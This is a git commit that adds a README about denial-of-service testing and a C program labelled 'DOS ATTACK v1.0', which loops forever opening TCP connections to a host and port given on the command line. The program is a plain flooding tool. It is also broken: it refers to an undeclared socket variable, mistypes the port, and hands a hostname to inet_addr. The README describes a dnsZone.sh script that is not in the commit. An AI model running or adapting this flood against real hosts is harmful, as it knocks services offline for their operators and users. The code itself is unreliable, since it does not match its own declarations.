1098dbc08d0e8be8b1172505a8fe8bbecab7131d
kubota <S1n0xt0nHK@protonmail.com>
2019-02-02 18:07:47 -0500

    First Code

---
+++ README.md
@@ -0,0 +1,17 @@
+# Testing for Denial of Service
+Testing for Denial of Service.
+
+#### Usage:
+```
+Usage: ./dnsZone.sh domain
+
+```
+#### Example:
+bash$ ./dnsZone.sh fakedomain.com
+
+
+#### TODO:
+- [ ] Write code in C
+https://www.owasp.org/index.php/Testing_for_Denial_of_Service
+
+
---
+++ dos-attack.c
@@ -0,0 +1,36 @@
+#include <stdio.h>
+#include <netdb.h>
+
+int main(int argc, char * argv[]){
+	
+	int mysocket;
+	int conect;
+
+	int * port;
+	char * target;
+	
+	target=argv[1];
+	port = argv[2];
+
+	struct sockaddr_in alvo;
+
+	if(argc < 2){
+		printf("|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|\n");
+		printf("|-|-|-|-|-|-|-|-|-|-|-|.. DOS ATTACK v1.0 |-|-|-|-|-|-|-|-|-|-|-|-|-|\n");
+		printf("|-|-|-|-|-|-|-|-| Uso: ./dos-attack target.com.ch  port |-|-|-|-|-|-|-|\n");
+		printf("|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|-|\n");
+		return(0);
+	}
+
+	while(1)
+	{
+		mysocket=socket(AF_INET,SOCK_STREAM,0);
+		alvo.sin_family=AF_INET;
+		alvo.sin_port=htons(port);
+		alvo.sin_addr.s_addr=inet_addr(target);
+		conect=connect(meusocket, (struct sockaddr *)&alvo, sizeof alvo);
+	}
+
+	close(mysocket);
+	close(conect);
+}
